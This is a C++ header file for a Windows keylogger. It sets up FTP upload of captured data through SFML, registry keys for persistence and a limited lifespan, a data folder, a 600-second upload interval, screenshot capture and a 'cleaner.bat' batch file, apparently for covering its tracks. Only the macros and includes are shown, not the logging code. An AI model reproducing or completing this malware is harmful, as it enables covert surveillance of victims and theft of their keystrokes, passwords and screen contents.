#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define USE_FTP

#define _WIN32_WINNT 0x0501

#ifdef USE_FTP
#define SFML_STATIC
#endif

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>
#include <map>

#ifdef USE_FTP
#include <SFML/Network.hpp>
#endif

#include "screenshot.h"

#define REGKEY_PERSIS "keylogger"
#define REGKEY_LIFETIME "lifespan"

#define DATADIR "data"

#define UPLOAD_DELTA 600

#define BATCH_NAME "cleaner.bat"

#define KEYLOGGER_LIFETIME "10"

